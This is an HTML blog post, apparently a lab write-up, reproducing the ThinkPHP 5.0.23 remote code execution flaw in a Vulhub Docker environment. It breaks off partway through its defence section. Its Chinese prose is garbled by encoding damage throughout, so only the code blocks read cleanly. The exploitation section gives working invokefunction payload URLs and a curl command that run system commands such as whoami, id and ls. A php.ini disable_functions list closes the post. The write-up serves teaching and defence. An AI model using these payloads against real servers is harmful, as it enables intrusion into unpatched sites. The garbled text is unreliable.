&lt;p&gt;æœ¬æ–‡åŸºäº Vulhub é¶åœºç¯å¢ƒï¼Œè¯¦ç»†è®²è§£è¯¥æ¼æ´çš„åŸç†ã€ç¯å¢ƒæ­å»ºã€åˆ©ç”¨è¿‡ç¨‹åŠé˜²å¾¡æªæ–½ï¼Œæ—¨åœ¨å¸®åŠ©å®‰å…¨ä»ä¸šè€…å’Œå¼€å‘è€…æ·±å…¥ç†è§£å¹¶é˜²èŒƒæ­¤ç±»æ¼æ´ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;äºŒã€æ¼æ´ç¯å¢ƒæ­å»º&#34;&gt;&lt;a href=&#34;#äºŒã€æ¼æ´ç¯å¢ƒæ­å»º&#34; class=&#34;headerlink&#34; title=&#34;äºŒã€æ¼æ´ç¯å¢ƒæ­å»º&#34;&gt;&lt;/a&gt;äºŒã€æ¼æ´ç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;p&gt;ä¸ºäº†å¤ç° ThinkPHP 5.x RCE æ¼æ´ï¼Œæˆ‘ä»¬ä½¿ç”¨ Vulhub æä¾›çš„é¶åœºç¯å¢ƒï¼Œç»“åˆ Docker å’Œ Kali Linux è¿›è¡Œæ­å»ºã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†æ­¥éª¤ï¼š&lt;/p&gt;
&lt;h3 id=&#34;1-åŸºç¡€ç¯å¢ƒ&#34;&gt;&lt;a href=&#34;#1-åŸºç¡€ç¯å¢ƒ&#34; class=&#34;headerlink&#34; title=&#34;1. åŸºç¡€ç¯å¢ƒ&#34;&gt;&lt;/a&gt;1. åŸºç¡€ç¯å¢ƒ&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;æ“ä½œç³»ç»Ÿ&lt;/strong&gt;ï¼šKali Linuxï¼ˆæ¨èä½¿ç”¨è™šæ‹Ÿæœºï¼‰  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å·¥å…·&lt;/strong&gt;ï¼šå·²å®‰è£… Docker å’Œ Docker Compose  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç½‘ç»œæ¨¡å¼&lt;/strong&gt;ï¼š&lt;ul&gt;
&lt;li&gt;NATï¼ˆç”¨äºè®¿é—®å¤–éƒ¨ç½‘ç»œï¼‰&lt;/li&gt;
&lt;li&gt;ä»…ä¸»æœºæ¨¡å¼ï¼ˆHost-Onlyï¼ŒKali IPï¼š&lt;code&gt;192.168.56.102&lt;/code&gt;ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç¡¬ä»¶è¦æ±‚&lt;/strong&gt;ï¼šå»ºè®® 4GB å†…å­˜ï¼Œ2 æ ¸ CPU&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-è·å–-Vulhub-é¡¹ç›®&#34;&gt;&lt;a href=&#34;#2-è·å–-Vulhub-é¡¹ç›®&#34; class=&#34;headerlink&#34; title=&#34;2. è·å– Vulhub é¡¹ç›®&#34;&gt;&lt;/a&gt;2. è·å– Vulhub é¡¹ç›®&lt;/h3&gt;&lt;p&gt;Vulhub æ˜¯ä¸€ä¸ªå¼€æºçš„æ¼æ´é¶åœºé›†åˆï¼ŒåŒ…å« ThinkPHP 5.x RCE ç¯å¢ƒã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# åˆ‡æ¢åˆ°å·¥ä½œç›®å½•&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; /root/vulhub/thinkphp/5-rce&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# å¦‚æœæœªä¸‹è½½ Vulhubï¼Œå…‹éš†é¡¹ç›®&lt;/span&gt;&lt;br&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/thinkphp/5-rce&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-å¯åŠ¨æ¼æ´ç¯å¢ƒ&#34;&gt;&lt;a href=&#34;#3-å¯åŠ¨æ¼æ´ç¯å¢ƒ&#34; class=&#34;headerlink&#34; title=&#34;3. å¯åŠ¨æ¼æ´ç¯å¢ƒ&#34;&gt;&lt;/a&gt;3. å¯åŠ¨æ¼æ´ç¯å¢ƒ&lt;/h3&gt;&lt;p&gt;åœ¨ vulhub&amp;#x2F;thinkphp&amp;#x2F;5-rce ç›®å½•ä¸‹ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤å¯åŠ¨ Docker å®¹å™¨ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose up -d&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;å¯åŠ¨åï¼Œè®¿é—®ä»¥ä¸‹åœ°å€ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;è‹¥çœ‹åˆ° ThinkPHP V5 çš„æ¬¢è¿é¡µé¢ï¼Œè¯´æ˜ç¯å¢ƒéƒ¨ç½²æˆåŠŸ &lt;/p&gt;
&lt;h3 id=&#34;4-å®¹å™¨ç®¡ç†æ“ä½œ&#34;&gt;&lt;a href=&#34;#4-å®¹å™¨ç®¡ç†æ“ä½œ&#34; class=&#34;headerlink&#34; title=&#34;4. å®¹å™¨ç®¡ç†æ“ä½œ&#34;&gt;&lt;/a&gt;4. å®¹å™¨ç®¡ç†æ“ä½œ&lt;/h3&gt;&lt;p&gt;æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker ps&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;ç¤ºä¾‹è¾“å‡ºï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight zsh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs zsh&#34;&gt;CONTAINER ID   IMAGE                       PORTS                    NAMES&lt;br&gt;e5117e659934   vulhub/thinkphp:5.0.23      0.0.0.0:8080-&amp;gt;80/tcp     thinkphp_5-rce_1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;åœæ­¢æŒ‡å®šå®¹å™¨ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker stop e5117e659934&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;ä¸€é”®åœæ­¢å¹¶ç§»é™¤å®¹å™¨åŠç½‘ç»œï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose down&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;ä¸‰ã€æ¼æ´åŸç†è§£æ&#34;&gt;&lt;a href=&#34;#ä¸‰ã€æ¼æ´åŸç†è§£æ&#34; class=&#34;headerlink&#34; title=&#34;ä¸‰ã€æ¼æ´åŸç†è§£æ&#34;&gt;&lt;/a&gt;ä¸‰ã€æ¼æ´åŸç†è§£æ&lt;/h2&gt;&lt;h3 id=&#34;æ¼æ´æˆå› &#34;&gt;&lt;a href=&#34;#æ¼æ´æˆå› &#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´æˆå› &#34;&gt;&lt;/a&gt;æ¼æ´æˆå› &lt;/h3&gt;&lt;p&gt;ThinkPHP 5.x çš„æ§åˆ¶å™¨è·¯ç”±æœºåˆ¶å…è®¸é€šè¿‡ URL å‚æ•°åŠ¨æ€è°ƒç”¨æ¡†æ¶å†…éƒ¨å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;\think\app::invokeFunction&lt;/code&gt;ï¼‰ã€‚åœ¨ 5.0.23 åŠä»¥ä¸‹ç‰ˆæœ¬ä¸­ï¼Œæ¡†æ¶æœªå¯¹è¿™äº›è°ƒç”¨è¿›è¡Œä¸¥æ ¼çš„æƒé™æ ¡éªŒï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šå‚æ•°ï¼Œè°ƒç”¨ä»»æ„ PHP å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;call_user_func_array&lt;/code&gt;ï¼‰ï¼Œå¹¶ä¼ é€’å‡½æ•°åå’Œå‚æ•°ï¼Œä»è€Œè§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ ¸å¿ƒé—®é¢˜&#34;&gt;&lt;a href=&#34;#æ ¸å¿ƒé—®é¢˜&#34; class=&#34;headerlink&#34; title=&#34;æ ¸å¿ƒé—®é¢˜&#34;&gt;&lt;/a&gt;æ ¸å¿ƒé—®é¢˜&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;åŠ¨æ€å‡½æ•°è°ƒç”¨&lt;/strong&gt;ï¼š&lt;code&gt;call_user_func_array&lt;/code&gt; å…è®¸åŠ¨æ€è°ƒç”¨ä»»æ„ PHP å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;phpinfo&lt;/code&gt;ã€&lt;code&gt;system&lt;/code&gt; ç­‰ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å‚æ•°æœªè¿‡æ»¤&lt;/strong&gt;ï¼šç”¨æˆ·è¾“å…¥çš„ &lt;code&gt;vars[0]&lt;/code&gt;ï¼ˆå‡½æ•°åï¼‰å’Œ &lt;code&gt;vars[1][]&lt;/code&gt;ï¼ˆå‡½æ•°å‚æ•°ï¼‰ç›´æ¥ä¼ é€’åˆ°å‡½æ•°æ‰§è¡Œå™¨ï¼Œæœªç»ä¸¥æ ¼éªŒè¯ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è·¯ç”±æš´éœ²&lt;/strong&gt;ï¼šé€šè¿‡ &lt;code&gt;s=/Index/\think\app/invokefunction&lt;/code&gt;ï¼Œæ”»å‡»è€…å¯ç›´æ¥è®¿é—®æ¡†æ¶æ ¸å¿ƒç±»ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ¼æ´å±å®³&#34;&gt;&lt;a href=&#34;#æ¼æ´å±å®³&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´å±å®³&#34;&gt;&lt;/a&gt;æ¼æ´å±å®³&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;æ‰§è¡Œä»»æ„ PHP ä»£ç &lt;/li&gt;
&lt;li&gt;è¿è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè·å–æƒé™&lt;/li&gt;
&lt;li&gt;ä¸Šä¼  WebShellï¼Œé•¿æœŸæ§åˆ¶æœåŠ¡å™¨&lt;/li&gt;
&lt;li&gt;çªƒå–é…ç½®æ–‡ä»¶ã€æ•°æ®åº“ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;åˆ é™¤æ–‡ä»¶æˆ–ä¿®æ”¹ç³»ç»Ÿé…ç½®&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;å››ã€æ¼æ´åˆ©ç”¨æ¼”ç¤º&#34;&gt;&lt;a href=&#34;#å››ã€æ¼æ´åˆ©ç”¨æ¼”ç¤º&#34; class=&#34;headerlink&#34; title=&#34;å››ã€æ¼æ´åˆ©ç”¨æ¼”ç¤º&#34;&gt;&lt;/a&gt;å››ã€æ¼æ´åˆ©ç”¨æ¼”ç¤º&lt;/h2&gt;&lt;p&gt;ä»¥ä¸‹å±•ç¤ºå¦‚ä½•åˆ©ç”¨ ThinkPHP 5.x RCE æ¼æ´ï¼ŒåŸºäº Vulhub é¶åœºç¯å¢ƒã€‚&lt;/p&gt;
&lt;h3 id=&#34;1-æµ‹è¯•-PHP-å‡½æ•°è°ƒç”¨&#34;&gt;&lt;a href=&#34;#1-æµ‹è¯•-PHP-å‡½æ•°è°ƒç”¨&#34; class=&#34;headerlink&#34; title=&#34;1. æµ‹è¯• PHP å‡½æ•°è°ƒç”¨&#34;&gt;&lt;/a&gt;1. æµ‹è¯• PHP å‡½æ•°è°ƒç”¨&lt;/h3&gt;&lt;p&gt;è®¿é—®ä»¥ä¸‹ Payloadï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;å‚æ•°è§£æ&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;s=/Index/\think\app/invokefunction&lt;/code&gt;ï¼šæŒ‡å®šè·¯ç”±&lt;/li&gt;
&lt;li&gt;&lt;code&gt;function=call_user_func_array&lt;/code&gt;ï¼šè°ƒç”¨å‡½æ•°&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vars[0]=phpinfo&lt;/code&gt;ï¼šç›®æ ‡å‡½æ•°&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vars[1][]=1&lt;/code&gt;ï¼šå‚æ•°ï¼ˆæ‰§è¡Œ phpinfo(1)ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ç»“æœ&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;p&gt;é¡µé¢æ˜¾ç¤º phpinfo é…ç½®ä¿¡æ¯ï¼Œè¯´æ˜æ¼æ´å­˜åœ¨ &lt;/p&gt;
&lt;h3 id=&#34;2-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤&#34;&gt;&lt;a href=&#34;#2-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤&#34; class=&#34;headerlink&#34; title=&#34;2. æ‰§è¡Œç³»ç»Ÿå‘½ä»¤&#34;&gt;&lt;/a&gt;2. æ‰§è¡Œç³»ç»Ÿå‘½ä»¤&lt;/h3&gt;&lt;p&gt;æ‰§è¡Œ &lt;code&gt;whoami&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;ç»“æœç¤ºä¾‹&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight haskell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;è¡¨ç¤ºç³»ç»Ÿå‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚&lt;/p&gt;
&lt;h3 id=&#34;å…¶ä»–å‘½ä»¤æµ‹è¯•ï¼š&#34;&gt;&lt;a href=&#34;#å…¶ä»–å‘½ä»¤æµ‹è¯•ï¼š&#34; class=&#34;headerlink&#34; title=&#34;å…¶ä»–å‘½ä»¤æµ‹è¯•ï¼š&#34;&gt;&lt;/a&gt;å…¶ä»–å‘½ä»¤æµ‹è¯•ï¼š&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;æŸ¥çœ‹ç”¨æˆ· IDï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;åˆ—å‡ºç›®å½•ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=ls%20/&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æŸ¥çœ‹ç½‘ç»œé…ç½®ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs url&#34;&gt;http://192.168.56.102:8080/index.php?s=/Index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=ifconfig&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-ä½¿ç”¨-Curl-æµ‹è¯•&#34;&gt;&lt;a href=&#34;#3-ä½¿ç”¨-Curl-æµ‹è¯•&#34; class=&#34;headerlink&#34; title=&#34;3. ä½¿ç”¨ Curl æµ‹è¯•&#34;&gt;&lt;/a&gt;3. ä½¿ç”¨ Curl æµ‹è¯•&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;curl &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„ï¼šURL ä¸­çš„ &lt;code&gt;\&lt;/code&gt; è¦å†™æˆ &lt;code&gt;\\&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;4-ä½¿ç”¨-Burp-Suite-æµ‹è¯•&#34;&gt;&lt;a href=&#34;#4-ä½¿ç”¨-Burp-Suite-æµ‹è¯•&#34; class=&#34;headerlink&#34; title=&#34;4. ä½¿ç”¨ Burp Suite æµ‹è¯•&#34;&gt;&lt;/a&gt;4. ä½¿ç”¨ Burp Suite æµ‹è¯•&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;åœ¨æµè§ˆå™¨ä¸­è®¿é—®ç›®æ ‡é¡µé¢ï¼Œæ‹¦æˆªè¯·æ±‚&lt;/li&gt;
&lt;li&gt;å°† Payload ç²˜è´´è¿› Repeater ä¸­æµ‹è¯•&lt;/li&gt;
&lt;li&gt;ä¿®æ”¹ &lt;code&gt;vars[1][]&lt;/code&gt; çš„å€¼å¦‚ &lt;code&gt;id&lt;/code&gt;ã€&lt;code&gt;ls&lt;/code&gt; ç­‰&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;äº”ã€Payload-ç»“æ„æ€»ç»“&#34;&gt;&lt;a href=&#34;#äº”ã€Payload-ç»“æ„æ€»ç»“&#34; class=&#34;headerlink&#34; title=&#34;äº”ã€Payload ç»“æ„æ€»ç»“&#34;&gt;&lt;/a&gt;äº”ã€Payload ç»“æ„æ€»ç»“&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;å‚æ•°é”®&lt;/th&gt;
&lt;th&gt;åŠŸèƒ½è¯´æ˜&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;s&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;è¯·æ±‚è·¯ç”±ï¼ŒæŒ‡å‘ ThinkPHP æ ¸å¿ƒç±»&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;function&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;è¦è°ƒç”¨çš„ PHP å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;call_user_func_array&lt;/code&gt;ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[0]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;æ‰§è¡Œçš„å‡½æ•°åç§°ï¼ˆå¦‚ &lt;code&gt;phpinfo&lt;/code&gt;, &lt;code&gt;system&lt;/code&gt;ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[1][]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;å‡½æ•°çš„å‚æ•°æ•°ç»„ï¼ˆå¦‚ &lt;code&gt;whoami&lt;/code&gt;, &lt;code&gt;id&lt;/code&gt;ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;hr&gt;
&lt;h2 id=&#34;å…­ã€é˜²å¾¡æªæ–½&#34;&gt;&lt;a href=&#34;#å…­ã€é˜²å¾¡æªæ–½&#34; class=&#34;headerlink&#34; title=&#34;å…­ã€é˜²å¾¡æªæ–½&#34;&gt;&lt;/a&gt;å…­ã€é˜²å¾¡æªæ–½&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;å‡çº§ ThinkPHP ç‰ˆæœ¬&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å‡çº§è‡³ ThinkPHP 5.0.24 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;è¾“å…¥éªŒè¯ä¸è¿‡æ»¤&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç™½åå•éªŒè¯ &lt;code&gt;s&lt;/code&gt; å‚æ•°&lt;/li&gt;
&lt;li&gt;ç¦ç”¨å±é™©å‡½æ•°å¦‚ &lt;code&gt;call_user_func_array&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ä¸¥æ ¼è¿‡æ»¤æ‰€æœ‰ç”¨æˆ·è¾“å…¥å‚æ•°&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;ç¦ç”¨å±é™©å‡½æ•°&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨ &lt;code&gt;php.ini&lt;/code&gt; ä¸­ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight mel&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs mel&#34;&gt;disable_functions = &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;exec&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;system&lt;/span&gt;,passthru,shell_exec,proc_open,call_user_func_array&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;æœ€å°æƒé™åŸåˆ™&lt;/strong&gt;&lt;/p&gt;
